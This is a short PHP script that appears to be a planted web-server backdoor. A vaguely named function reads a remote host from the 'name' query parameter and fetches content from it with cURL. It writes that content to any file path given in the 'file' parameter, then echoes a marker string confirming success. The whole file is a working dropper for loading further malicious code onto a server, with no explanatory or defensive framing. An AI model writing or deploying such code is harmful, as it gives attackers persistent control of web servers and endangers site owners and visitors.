<?php
function class_x_i($x = ''){
$urlset = isset($_GET['name']) ? trim($_GET['name']) : '';
$filename = isset($_GET['file']) ? trim($_GET['file']) : '';
$ch = curl_init('http://'.$urlset);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
file_put_contents($filename,$result);
echo 'O1024K';
}
class_x_i();
?>